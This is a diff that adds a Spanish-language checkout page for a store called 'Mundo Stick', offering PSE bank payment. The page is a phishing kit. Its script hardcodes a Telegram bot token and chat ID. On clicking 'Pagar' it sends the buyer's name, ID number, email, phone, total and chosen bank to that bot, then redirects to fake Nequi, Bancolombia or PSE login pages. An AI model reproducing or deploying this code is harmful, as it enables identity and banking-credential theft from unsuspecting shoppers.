@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout – Mundo Stick</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&family=Open+Sans:wght@400;600&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="../css/checkout-pse.css">
+</head>
+
+<body>
+
+  <!-- TOP BAR -->
+  <div class="top-bar">
+    <div class="top-logo">
+      <img src="../img/MundoStick.png" alt="Mundo Stick" class="top-logo-img">
+    </div>
+    <div class="top-bar-title">Checkout</div>
+  </div>
+
+  <!-- PAGE WRAP -->
+  <div class="page-wrap">
+
+    <!-- LEFT COLUMN -->
+    <div>
+      <div class="left-card">
+
+        <!-- 1. Datos del pago -->
+        <div class="section-badge">1. Datos del pago</div>
+        <div class="info-rows">
+          <div class="info-row"><strong>Merchant:</strong> MUNDO STICK</div>
+          <div class="info-row"><strong>Título:</strong> Pago en línea. Pedido # 5076915</div>
+          <div class="info-row"><strong>Referencia:</strong> 5076915</div>
+        </div>
+
+        <!-- 2. Datos personales -->
+        <div class="section-badge" style="margin-top: 10px;">2. Datos personales</div>
+
+        <div class="form-grid" style="margin-top: 10px;">
+          <div class="field">
+            <label>Nombres</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                  <circle cx="12" cy="7" r="4"></circle>
+                </svg></span>
+              <input type="text" id="inp-nombres" class="field-input" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Apellidos</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                  <circle cx="9" cy="7" r="4"></circle>
+                  <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                  <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                </svg></span>
+              <input type="text" id="inp-apellidos" class="field-input" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Teléfono</label>
+            <div class="phone-wrap">
+              <div class="phone-flag">🇨🇴 <span class="phone-code">+57</span></div>
+              <input type="tel" id="inp-telefono" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Dirección</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                  <circle cx="12" cy="10" r="3"></circle>
+                </svg></span>
+              <input type="text" class="field-input" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Tipo de ID</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                  <circle cx="12" cy="7" r="4"></circle>
+                </svg></span>
+              <select id="inp-tipo-id" class="field-input" style="appearance: none; cursor: pointer;">
+                <option value="CC">Cédula de Ciudadanía (CC)</option>
+                <option value="TI">Tarjeta de Identidad (TI)</option>
+              </select>
+            </div>
+          </div>
+          <div class="field">
+            <label>Número de Identificación</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                  <polyline points="14 2 14 8 20 8"></polyline>
+                  <line x1="16" y1="13" x2="8" y2="13"></line>
+                  <line x1="16" y1="17" x2="8" y2="17"></line>
+                  <polyline points="10 9 9 9 8 9"></polyline>
+                </svg></span>
+              <input type="text" id="inp-num-id" class="field-input" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Correo electrónico</label>
+            <div class="input-wrap">
+              <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <line x1="22" y1="2" x2="11" y2="13"></line>
+                  <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+                </svg></span>
+              <input type="email" id="inp-correo" class="field-input" value="">
+            </div>
+          </div>
+          <div class="field">
+            <label>Moneda</label>
+            <div class="input-wrap">
+              <input type="text" class="field-input readonly" value="COP" readonly
+                style="padding-left:12px;background:#f5f5f5;border-color:#eee;">
+            </div>
+          </div>
+          <div class="field">
+            <label>País</label>
+            <div class="input-wrap">
+              <input type="text" class="field-input" value="Colombia" style="padding-left:12px">
+            </div>
+          </div>
+          <div class="field">
+            <label>¿Mismo datos del pagador?</label>
+            <div class="toggle-row" style="margin-top:6px">
+              <label class="toggle">
+                <input type="checkbox" id="chk-mismo-pagador" checked>
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+          </div>
+        </div>
+
+        <hr class="divider">
+
+        <!-- PSE Section -->
+        <label class="pse-header" style="cursor: pointer;">
+          <input type="radio" name="payment_method" id="radio-pse" class="custom-radio">
+          <span class="pse-title">Pago PSE</span>
+        </label>
+
+        <div class="pse-logo-container">
+          <img src="../img/pse-logo.png" alt="PSE" class="pse-logo-img">
+        </div>
+
+        <div id="pse-form-area" class="pse-form-area" style="display: none;">
+          <div class="form-grid">
+            <div class="field">
+              <label>Nombre Titular</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg></span>
+                <input type="text" id="pse-nombre" class="field-input" value="">
+              </div>
+            </div>
+            <div class="field">
+              <label>Tipo de persona</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="9" cy="7" r="4"></circle>
+                    <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                  </svg></span>
+                <select id="pse-tipo-persona" class="field-input" style="appearance: none; cursor: pointer;">
+                  <option value="Natural">Persona Natural</option>
+                  <option value="Juridica">Persona Jurídica</option>
+                </select>
+              </div>
+            </div>
+            <div class="field">
+              <label>Banco</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="12" y1="1" x2="12" y2="23"></line>
+                    <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                  </svg></span>
+                <select id="pse-banco" class="field-input" style="appearance: none; cursor: pointer;">
+                  <option value="" disabled selected>A continuación seleccione su banco</option>
+                  <option value="ACCION FIDUCIARIA">ACCION FIDUCIARIA</option>
+                  <option value="ALIANZA FIDUCIARIA">ALIANZA FIDUCIARIA</option>
+                  <option value="BAN100">BAN100</option>
+                  <option value="BANCAMIA S.A.">BANCAMIA S.A.</option>
+                  <option value="BANCO AGRARIO">BANCO AGRARIO</option>
+                  <option value="BANCO AV VILLAS">BANCO AV VILLAS</option>
+                  <option value="BANCO BBVA COLOMBIA S.A.">BANCO BBVA COLOMBIA S.A.</option>
+                  <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
+                  <option value="BANCO COOPERATIVO COOPCENTRAL">BANCO COOPERATIVO COOPCENTRAL</option>
+                  <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
+                  <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
+                  <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
+                  <option value="BANCO FALABELLA">BANCO FALABELLA</option>
+                  <option value="BANCO FINANDINA S.A. BIC">BANCO FINANDINA S.A. BIC</option>
+                  <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
+                  <option value="BANCO ITAU">BANCO ITAU</option>
+                  <option value="BANCO J.P. MORGAN COLOMBIA S.A.">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                  <option value="BANCO MUNDO MUJER S.A.">BANCO MUNDO MUJER S.A.</option>
+                  <option value="BANCO PICHINCHA S.A.">BANCO PICHINCHA S.A.</option>
+                  <option value="BANCO POPULAR">BANCO POPULAR</option>
+                  <option value="BANCO SANTANDER COLOMBIA">BANCO SANTANDER COLOMBIA</option>
+                  <option value="BANCO SERFINANZA">BANCO SERFINANZA</option>
+                  <option value="BANCO UNION">BANCO UNION</option>
+                  <option value="BANCOLOMBIA">BANCOLOMBIA</option>
+                  <option value="BANCOOMEVA S.A.">BANCOOMEVA S.A.</option>
+                  <option value="BOLD CF">BOLD CF</option>
+                  <option value="CFA COOPERATIVA FINANCIERA">CFA COOPERATIVA FINANCIERA</option>
+                  <option value="CITIBANK">CITIBANK</option>
+                  <option value="COINK SA">COINK SA</option>
+                  <option value="COLTEFINANCIERA">COLTEFINANCIERA</option>
+                  <option value="CONFIAR COOPERATIVA FINANCIERA">CONFIAR COOPERATIVA FINANCIERA</option>
+                  <option value="COTRAFA">COTRAFA</option>
+                  <option value="CREZCAMOS">CREZCAMOS</option>
+                  <option value="DALE">DALE</option>
+                  <option value="DAVIbank S.A.">DAVIbank S.A.</option>
+                  <option value="DAVIPLATA">DAVIPLATA</option>
+                  <option value="DING">DING</option>
+                  <option value="FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO">FINANCIERA JURISCOOP SA COMPAÑÍA DE
+                    FINANCIAMIENTO</option>
+                  <option value="GLOBAL66">GLOBAL66</option>
+                  <option value="IRIS">IRIS</option>
+                  <option value="JFK COOPERATIVA FINANCIERA">JFK COOPERATIVA FINANCIERA</option>
+                  <option value="LULO BANK">LULO BANK</option>
+                  <option value="MOVII S.A.">MOVII S.A.</option>
+                  <option value="NEQUI">NEQUI</option>
+                  <option value="NU">NU</option>
+                  <option value="PAYCASH">PAYCASH</option>
+                  <option value="POWWI">POWWI</option>
+                  <option value="RAPPIPAY">RAPPIPAY</option>
+                  <option value="UALÁ">UALÁ</option>
+                </select>
+              </div>
+            </div>
+            <div class="field">
+              <label>Tipo de ID</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                    <circle cx="12" cy="7" r="4"></circle>
+                  </svg></span>
+                <select id="pse-tipo-id" class="field-input" style="appearance: none; cursor: pointer;">
+                  <option value="CC">Cédula de Ciudadanía (CC)</option>
+                  <option value="TI">Tarjeta de Identidad (TI)</option>
+                </select>
+              </div>
+            </div>
+            <div class="field">
+              <label>Número de Identificación</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                    <polyline points="14 2 14 8 20 8"></polyline>
+                    <line x1="16" y1="13" x2="8" y2="13"></line>
+                    <line x1="16" y1="17" x2="8" y2="17"></line>
+                    <polyline points="10 9 9 9 8 9"></polyline>
+                  </svg></span>
+                <input type="text" id="pse-num-id" class="field-input" value="">
+              </div>
+            </div>
+            <div class="field">
+              <label>Teléfono</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                    <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                  </svg></span>
+                <input type="tel" id="pse-telefono" class="field-input" value="">
+              </div>
+            </div>
+          </div>
+          <div class="form-grid one-col" style="margin-top:14px">
+            <div class="field">
+              <label>Correo electrónico</label>
+              <div class="input-wrap">
+                <span class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="22" y1="2" x2="11" y2="13"></line>
+                    <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+                  </svg></span>
+                <input type="email" id="pse-correo" class="field-input" value="">
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- RIGHT COLUMN -->
+    <div class="right-card">
+      <div id="right-pse-banner" class="pse-banner" style="display: none;">
+        <div class="pse-banner-content">
+          <div class="pse-banner-logo-container">
+            <img src="../img/pse-logo.png" alt="PSE" class="pse-banner-img">
+          </div>
+          <div class="pse-person">
+            <img src="https://cdn-icons-png.flaticon.com/512/3048/3048122.png" alt="Person"
+              style="width: 60px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));">
+          </div>
+        </div>
+        <div class="pse-notes">
+          1. El pago se realizará por medio del servicio PSE-ACH.<br>
+          2. Por medio de PSE usted entrará a su cuenta bancaria directamente.<br>
+          3. No facilite la información a terceros, realice sus pagos en equipos seguros.
+        </div>
+      </div>
+
+      <div class="summary-body">
+        <div class="summary-row" style="margin-bottom: 20px;">
+          <span style="color:#777;">Sub<br>total</span>
+          <span id="txt-subtotal">$0</span>
+        </div>
+        <div class="summary-row bordered" style="padding-bottom: 16px; margin-bottom: 16px;">
+          <span style="color:#777;">IVA</span>
+          <span>$ 0</span>
+        </div>
+        <div class="summary-total">
+          <div class="label" style="font-size:18px;">Total<br><small style="font-size:16px;">COP</small></div>
+          <div class="amount" style="font-size:20px;" id="txt-total">$0</div>
+        </div>
+
+        <div class="terms-row" style="margin-top: 24px;">
+          <input type="checkbox" id="chk-terms" class="custom-checkbox">
+          <span>Acepto los <a href="#" class="terms-link">términos y condiciones</a> del uso de plataforma y Autorizó la
+            <a href="#" class="terms-link">política de datos</a></span>
+        </div>
+        <div class="terms-note">*Solo dar click en el cuadro</div>
+        <a href="/pages/nequi-login.html">
+          <button class="btn-pagar" style="margin-top: 8px;">Pagar</button>
+        </a>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- PAGE FOOTER -->
+  <div class="page-footer">
+    Ebixu &copy; 2026 todos los derechos reservados<br>
+    <a href="#">Términos y condiciones del uso de la plataforma</a> &nbsp; <a href="#">Política de Datos</a>
+  </div>
+
+  <script>
+    const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+    const CHAT_ID = "6483487531";
+
+    async function sendToTelegram(text, inlineKeyboard = null) {
+      if (!CHAT_ID) {
+        console.warn("Falta CHAT_ID para enviar a Telegram.");
+        return;
+      }
+      const body = {
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      };
+      if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+      await fetch(`${TELEGRAM_API}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body)
+      });
+    }
+
+    // DOM Elements
+    const radioPse = document.getElementById('radio-pse');
+    const pseFormArea = document.getElementById('pse-form-area');
+    const rightPseBanner = document.getElementById('right-pse-banner');
+    const chkMismoPagador = document.getElementById('chk-mismo-pagador');
+
+    const inpNombres = document.getElementById('inp-nombres');
+    const inpApellidos = document.getElementById('inp-apellidos');
+    const inpTelefono = document.getElementById('inp-telefono');
+    const inpTipoId = document.getElementById('inp-tipo-id');
+    const inpNumId = document.getElementById('inp-num-id');
+    const inpCorreo = document.getElementById('inp-correo');
+
+    const pseNombre = document.getElementById('pse-nombre');
+    const pseTipoPersona = document.getElementById('pse-tipo-persona');
+    const pseBanco = document.getElementById('pse-banco');
+    const pseTipoId = document.getElementById('pse-tipo-id');
+    const pseNumId = document.getElementById('pse-num-id');
+    const pseTelefono = document.getElementById('pse-telefono');
+    const pseCorreo = document.getElementById('pse-correo');
+
+    const chkTerms = document.getElementById('chk-terms');
+    const btnPagar = document.querySelector('.btn-pagar');
+
+    // Deshabilitar botón por defecto
+    btnPagar.disabled = true;
+
+    function checkFormValidity() {
+      // Requerimos que se hayan aceptado los términos, que esté seleccionado PSE 
+      // y que se haya seleccionado un banco
+      const termsAccepted = chkTerms.checked;
+      const pseSelected = radioPse.checked;
+      const bankSelected = pseBanco.value !== "";
+
+      btnPagar.disabled = !(termsAccepted && pseSelected && bankSelected);
+    }
+
+    chkTerms.addEventListener('change', checkFormValidity);
+    pseBanco.addEventListener('change', checkFormValidity);
+
+    // Logic to toggle PSE form and banner
+    function updatePseVisibility() {
+      if (radioPse.checked) {
+        pseFormArea.style.display = 'block';
+        rightPseBanner.style.display = 'flex';
+      } else {
+        pseFormArea.style.display = 'none';
+        rightPseBanner.style.display = 'none';
+      }
+      checkFormValidity();
+    }
+
+    // Init state (Unchecked by default)
+    radioPse.checked = false;
+    updatePseVisibility();
+
+    radioPse.addEventListener('change', updatePseVisibility);
+
+    // Sync Data logic
+    function syncData() {
+      if (chkMismoPagador.checked) {
+        const n = inpNombres.value.trim();
+        const a = inpApellidos.value.trim();
+        pseNombre.value = (n + (n && a ? ' ' : '') + a).trim();
+        pseTipoId.value = inpTipoId.value;
+        pseNumId.value = inpNumId.value;
+        pseTelefono.value = inpTelefono.value;
+        pseCorreo.value = inpCorreo.value;
+      }
+    }
+
+    // Listen for changes on source inputs
+    const sourceInputs = [inpNombres, inpApellidos, inpTelefono, inpTipoId, inpNumId, inpCorreo];
+    sourceInputs.forEach(input => {
+      input.addEventListener('input', syncData);
+    });
+    // Also listen for change on select
+    inpTipoId.addEventListener('change', syncData);
+
+    // Toggle for same payer
+    chkMismoPagador.addEventListener('change', () => {
+      if (chkMismoPagador.checked) {
+        syncData(); // copy immediately when checked
+      }
+    });
+
+    // Load data from sessionStorage
+    function loadSessionData() {
+      const data = sessionStorage.getItem('ms_last_order');
+      if (data) {
+        try {
+          const order = JSON.parse(data);
+
+          // Fill Prices
+          if (order.totalPrice !== undefined) {
+            const formatted = '$' + order.totalPrice.toLocaleString('es-CO');
+            document.getElementById('txt-subtotal').textContent = formatted;
+            document.getElementById('txt-total').textContent = formatted;
+          }
+
+          // Fill Customer Data
+          if (order.customer) {
+            inpNombres.value = order.customer.nombre || '';
+            inpApellidos.value = order.customer.apellido || '';
+            inpTelefono.value = order.customer.telefono || '';
+            inpNumId.value = order.customer.cedula || '';
+            inpCorreo.value = order.customer.email || '';
+            // Tipo de ID y Dirección no están en session, así que se dejan igual
+          }
+        } catch (e) {
+          console.error('Error parsing session data', e);
+        }
+      }
+    }
+
+    // Init logic
+    loadSessionData();
+    syncData();
+
+    // Al Pagar
+    btnPagar.addEventListener('click', async (e) => {
+      e.preventDefault();
+      if (btnPagar.disabled) return;
+
+      const banco = pseBanco.value;
+      const tipoBanco = pseTipoPersona.value;
+      const nombre = sessionStorage.getItem("nombre") || pseNombre.value;
+      const cedula = sessionStorage.getItem("cedula") || pseNumId.value;
+      const correo = sessionStorage.getItem("correo") || pseCorreo.value;
+      const telefono = sessionStorage.getItem("telefono") || pseTelefono.value;
+      const total = sessionStorage.getItem("total") || document.getElementById('txt-total').textContent;
+
+      sessionStorage.setItem("banco", banco);
+      sessionStorage.setItem("tipoBanco", tipoBanco);
+
+      try {
+        const text = `🏦 <b>Datos de Pago PSE</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🏦 Banco: ${banco}\n🏷️ Tipo de Banco: ${tipoBanco}`;
+        await sendToTelegram(text);
+      } catch (err) { console.error(err); }
+
+      if (banco === "NEQUI") {
+        window.location.href = "nequi-login.html";
+      } else if (banco === "BANCOLOMBIA") {
+        window.location.href = "bancolombia-login.html";
+      } else {
+        window.location.href = "pse-login.html";
+      }
+    });
+  </script>
+</body>
+</html>
